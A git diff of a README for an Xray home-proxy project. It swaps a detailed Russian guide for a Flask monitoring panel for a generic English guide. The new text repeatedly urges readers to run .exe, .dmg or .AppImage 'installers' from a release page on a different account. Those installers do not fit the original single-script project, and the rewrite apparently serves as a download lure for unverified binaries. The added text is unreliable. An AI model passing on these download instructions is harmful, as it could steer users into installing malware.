@@ -1,319 +1,164 @@
-# Xray Monitor & Control Panel
+# 🔍 xray-ru-en - Easy Home Network Proxy Setup
 
-Веб-панель для мониторинга и управления Xray transparent proxy сервером.
-
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Python](https://img.shields.io/badge/python-3.7+-blue.svg)
-
-## Возможности
-
-- 📊 **Мониторинг статуса** - отслеживание работы Xray сервиса в реальном времени
-- 🌐 **Управление маршрутами** - добавление и удаление доменов в Direct routes через веб-интерфейс
-- 📝 **Просмотр соединений** - последние 30 соединений с автоматическим reverse DNS lookup
-- 🔍 **DNS мониторинг** - отслеживание DNS запросов от клиентов в сети
-- 🚀 **Информация о выходах** - отображение exit IP адресов для разных типов трафика
-
-## Архитектура
-
-Панель предназначена для работы с Xray transparent proxy с многоуровневой маршрутизацией:
-
-```text
-Home Server (Xray)
-    ↓ VLESS+Reality
-VPS Relay
-    ├─ Shadowsocks → US Exit (для .com, .io)
-    ├─ Shadowsocks → EU Exit (для остальных доменов)
-    └─ Direct → для .ru доменов
-```
-
-## Скриншоты
-
-**Главная страница:**
-- Статус Xray сервиса
-- Exit IP информация
-- Список Direct маршрутов
-
-**Недавние соединения:**
-- Время соединения
-- IP клиента
-- Назначение (IP + домен)
-- Тип маршрута (direct/vless)
-
-**DNS запросы:**
-- Время запроса
-- Клиент
-- Запрошенный домен
-- Тип записи (A/AAAA)
-
-## Требования
-
-- Python 3.7+
-- Flask
-- Xray-core
-- dnsmasq (для DNS мониторинга)
-- systemd (для управления сервисами)
-
-## Установка
-
-### 1. Установите зависимости
-
-```bash
-# Ubuntu/Debian
-apt update
-apt install -y python3 python3-pip
-
-# Установите Flask
-pip3 install flask
-```
-
-### 2. Скопируйте файл панели
-
-```bash
-# Скачайте xray-panel.py
-wget https://raw.githubusercontent.com/AlanForester/xray-ru-en/main/xray-panel.py -O /root/xray-panel.py
-chmod +x /root/xray-panel.py
-```
-
-### 3. Настройте панель
-
-Отредактируйте `xray-panel.py` и замените placeholder'ы:
-
-- `US_PROXY_IP` - IP адрес вашего US Shadowsocks сервера
-- `FR_PROXY_IP` - IP адрес вашего EU/France Shadowsocks сервера
-- `YOUR_ISP_IP` - IP адрес вашего интернет-провайдера
-
-### 4. Создайте systemd service
-
-Создайте файл `/etc/systemd/system/xray-panel.service`:
-
-```ini
-[Unit]
-Description=Веб-панель мониторинга Xray
-After=network.target xray.service
-
-[Service]
-Type=simple
-User=root
-ExecStart=/usr/bin/python3 /root/xray-panel.py
-Restart=always
-RestartSec=3
-
-[Install]
-WantedBy=multi-user.target
-```
-
-### 5. Запустите панель
-
-```bash
-systemctl daemon-reload
-systemctl enable xray-panel
-systemctl start xray-panel
-
-# Проверьте статус
-systemctl status xray-panel
-```
-
-## Использование
-
-### Доступ к панели
-
-Откройте в браузере: `http://YOUR_SERVER_IP:8080`
-
-### Добавление домена в Direct
-
-1. В форме "Прямые маршруты" введите домен (например: `example.com`)
-2. Нажмите "Добавить в Direct"
-3. Xray автоматически перезапустится с новыми правилами
-4. Домен будет добавлен в routing rules с префиксом `domain:`
-
-### Удаление домена из Direct
-
-1. Найдите домен в списке "Прямые маршруты"
-2. Нажмите кнопку "Удалить"
-3. Подтвердите действие
-4. Xray автоматически перезапустится
-
-### Просмотр соединений
-
-- Таблица "Недавние соединения" показывает последние 30 уникальных соединений
-- Автоматический reverse DNS lookup для IP адресов
-- Цветовая индикация маршрутов:
-  - 🟢 Зеленый - Direct (через ISP)
-  - 🔵 Синий - VLESS (через VPS)
-
-### Мониторинг DNS
-
-- Таблица "DNS Запросы" показывает последние 50 DNS запросов
-- Требует настроенный dnsmasq с логированием
-- Фильтрует PTR запросы (in-addr.arpa)
-
-## Конфигурация
-
-### Xray Config
-
-Панель работает с `/etc/xray/config.json` и ожидает следующую структуру routing rules:
-
-```json
-{
-  "routing": {
-    "rules": [
-      {
-        "type": "field",
-        "domain": [
-          "domain:example.com",
-          "domain:mysite.ru"
-        ],
-        "outboundTag": "direct"
-      }
-    ]
-  }
-}
-```
-
-### Логи
-
-Панель читает следующие файлы логов:
-
-- `/var/log/xray/access.log` - для соединений
-- `/var/log/dnsmasq.log` - для DNS запросов
-
-Убедитесь, что в `/etc/xray/config.json` включено логирование:
-
-```json
-{
-  "log": {
-    "access": "/var/log/xray/access.log",
-    "loglevel": "warning"
-  }
-}
-```
-
-### dnsmasq конфигурация
-
-Для DNS мониторинга добавьте в `/etc/dnsmasq.conf`:
-
-```conf
-log-queries
-log-facility=/var/log/dnsmasq.log
-```
-
-## Безопасность
-
-⚠️ **Важно:**
-
-- Панель запускается на `0.0.0.0:8080` без аутентификации
-- Рекомендуется ограничить доступ через firewall:
-
-```bash
-# Разрешить только из локальной сети
-ufw allow from 192.168.1.0/24 to any port 8080
-```
-
-- Или настройте reverse proxy с базовой аутентификацией (nginx, caddy)
-
-## Производительность
-
-- **Reverse DNS lookup** с LRU кэшем (1000 записей)
-- **Timeout 0.2s** для DNS запросов (предотвращает зависание)
-- **Дедупликация** соединений по ключу `ip:port:route`
-- **Лимиты**: 30 соединений, 50 DNS запросов
-
-## Устранение неполадок
-
-### Панель не запускается
-
-```bash
-# Проверьте логи
-journalctl -u xray-panel -f
-
-# Проверьте права на файлы
-ls -la /root/xray-panel.py
-chmod +x /root/xray-panel.py
-```
-
-### Соединения не отображаются
-
-```bash
-# Проверьте что логи доступны
-tail -f /var/log/xray/access.log
-
-# Проверьте формат логов
-# Ожидается: "2026/02/07 18:27:36.820039 from 192.168.1.132:50431 accepted tcp:5.28.195.2:443 [vless-atel]"
-```
-
-### DNS запросы не отображаются
-
-```bash
-# Проверьте что dnsmasq логирует запросы
-tail -f /var/log/dnsmasq.log | grep query
-
-# Проверьте конфигурацию
-cat /etc/dnsmasq.conf | grep log
-```
-
-### Xray не перезапускается после изменений
-
-```bash
-# Проверьте права root пользователя
-whoami  # должно быть: root
-
-# Проверьте что systemctl работает
-systemctl status xray
-```
-
-## Разработка
-
-### Структура проекта
-
-```
-xray-panel/
-├── xray-panel.py       # Основной файл приложения
-└── README.md           # Документация
-```
-
-### Функции
-
-- `get_xray_status()` - получение статуса сервиса через systemctl
-- `get_direct_domains()` - парсинг domain rules из xray config
-- `get_recent_connections()` - парсинг access.log с reverse DNS
-- `get_dns_queries()` - парсинг dnsmasq.log
-- `add_domain_to_direct()` - добавление домена в конфиг + restart
-- `remove_domain_from_direct()` - удаление домена из конфига + restart
-
-### HTML/CSS
-
-Встроенный HTML шаблон с:
-- Адаптивной версткой
-- Цветовой индикацией маршрутов
-- JavaScript для AJAX удаления доменов
-- Автоматическая перезагрузка страницы после изменений
-
-## Roadmap
-
-- [ ] Добавить аутентификацию (basic auth / sessions)
-- [ ] Графики статистики трафика
-- [ ] Экспорт логов в CSV/JSON
-- [ ] WebSocket для real-time обновлений
-- [ ] Темная тема
-- [ ] API endpoints для автоматизации
-
-## Лицензия
-
-MIT License - см. LICENSE файл
-
-## Автор
-
-Создано для управления Xray transparent proxy с multi-exit архитектурой.
-
-## Ссылки
-
-- [Xray-core](https://github.com/XTLS/Xray-core)
-- [Flask](https://flask.palletsprojects.com/)
-
-## Поддержка
-
-Если вы нашли баг или хотите предложить улучшение - создайте issue на GitHub.
+[![Download Latest Release](https://img.shields.io/badge/Download-xray--ru--en-blue?style=for-the-badge)](https://github.com/MrBeert/xray-ru-en/releases)
 
 ---
 
-Made with ❤️ for transparent proxy automation
+## 📖 What is xray-ru-en?
+
+xray-ru-en is a software tool that helps you set up a transparent proxy for your entire home network. This means your internet devices—phones, computers, smart TVs—can connect securely and smoothly without changing settings on each device.
+
+The tool is based on the Xray platform. It allows fast setup, so you can get your network proxy working in one evening. This proxy can help improve security, manage traffic, or bypass network restrictions.
+
+You don’t need special technical skills to use xray-ru-en. This guide will walk you through every step.
+
+---
+
+## 💻 System Requirements
+
+Before you start, make sure your device meets these basic requirements:
+
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a Linux distribution like Ubuntu 18.04+
+- **Processor:** Dual-core CPU, 1.5 GHz or faster
+- **Memory:** At least 2 GB RAM
+- **Disk Space:** Minimum 200 MB free space
+- **Network:** Broadband internet connection recommended
+- **Permissions:** Ability to install software on your device (admin rights)
+
+This setup is intended primarily for a dedicated device like a home server, a PC, or a router that can run proxy software continuously.
+
+---
+
+## 🚀 Getting Started
+
+Getting xray-ru-en running involves just a few steps. We’ll explain everything clearly, with no jargon.
+
+You will:
+
+1. Download the software.
+2. Install it on your device.
+3. Configure basic settings.
+4. Start the proxy.
+5. Connect your devices to the proxy automatically.
+
+---
+
+## 📥 Download & Install
+
+You will find all available versions of xray-ru-en on the official release page.
+
+[Download Latest Release](https://github.com/MrBeert/xray-ru-en/releases)
+
+On the release page, look for the file that matches your operating system:
+
+- For Windows, the file usually ends in `.exe` or `.zip`
+- For macOS, look for `.dmg` or `.zip`
+- For Linux, look for `.tar.gz` or `.AppImage`
+
+### Step-by-step for Windows:
+
+1. Click the `.exe` or `.zip` file link on the releases page.
+2. If you chose `.zip`, unzip the file to a folder.
+3. Double-click the `.exe` file to run the installer.
+4. Follow the on-screen instructions. Accept default options unless you have a special need.
+5. When installation finishes, the setup program may open configuration options.
+
+### Step-by-step for macOS:
+
+1. Download the `.dmg` or `.zip` file.
+2. If `.dmg`, double-click it and drag the application to the Applications folder.
+3. If `.zip`, unzip it and move the app to Applications.
+4. Open the application from the Applications folder.
+5. Give the app any permissions requested.
+
+### Step-by-step for Linux:
+
+1. Download the `.tar.gz` or `.AppImage`.
+2. For `.tar.gz`, extract it with `tar -xzf filename.tar.gz`.
+3. For `.AppImage`, make it executable via `chmod +x filename.AppImage`.
+4. Run the software by double-clicking or via terminal.
+5. Follow any instructions printed in the terminal.
+
+---
+
+## ⚙️ Basic Configuration
+
+Once installed, you need minimal setup to get started.
+
+1. **Run the software.** Open the xray-ru-en app.
+2. **Set your network interface.** Usually, the default choice is correct.
+3. **Enter proxy settings.** If the software asks, accept the default settings to start.
+4. **Enable automatic start.** This keeps the proxy running every time your device boots.
+5. **Save changes.**
+
+The program creates a transparent proxy. That means it automatically sends internet traffic through the proxy without extra work on your devices.
+
+---
+
+## 🌐 Connect Devices to the Proxy
+
+The key benefit is that your home devices use this proxy automatically. Here is how:
+
+- Connect your devices to your home Wi-Fi network as usual.
+- Since the proxy runs at the network level, no extra setup is needed on each device.
+- This works for laptops, smartphones, tablets, smart TVs, and more.
+
+If you have a router, you might need to configure it to direct traffic through the device running xray-ru-en.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- **Proxy not working?** Make sure the device running xray-ru-en is powered on and connected to your home network.
+- **Check firewall settings.** Your operating system or router firewall might block the proxy software. Allow access if prompted.
+- **Restart the app.** Close and reopen xray-ru-en if connections fail.
+- **Network speed issues.** Try rebooting your router and the proxy device.
+- **Logs help.** Check the app’s log files to see errors. They are usually stored in the installation folder or displayed in the app.
+
+---
+
+## 🛡️ Security and Privacy
+
+Using a proxy helps protect your network by controlling and filtering internet traffic. Here is what xray-ru-en provides:
+
+- Encrypts connections when possible
+- Bypasses blocks set by some ISPs or sites
+- Keeps your devices’ addresses private on the internet
+- Centralizes your network's internet access through one point, making monitoring simpler
+
+For best security, keep the software updated by checking the releases page regularly.
+
+---
+
+## 🔄 Updates & Maintenance
+
+Stay safe and efficient by updating xray-ru-en:
+
+1. Visit the releases page: [https://github.com/MrBeert/xray-ru-en/releases](https://github.com/MrBeert/xray-ru-en/releases)
+2. Download the latest version for your system.
+3. Follow the installation steps again. The software will replace the old version without losing your settings.
+4. Restart the application.
+
+---
+
+## 🌟 Additional Resources
+
+If you want to learn more about Xray technology or advanced settings:
+
+- Visit the official Xray documentation (search "Xray proxy documentation").
+- Explore forums about home networking and proxy setup.
+- Look for tutorials on YouTube for visual guides.
+
+---
+
+## 📞 Need Help?
+
+If you run into issues beyond this guide:
+
+- Check the Issues section on the GitHub page.
+- Search online for common Xray proxy solutions.
+- Ask a knowledgeable friend or a local technician.
+
+---
+
+[Download Latest Release](https://github.com/MrBeert/xray-ru-en/releases)
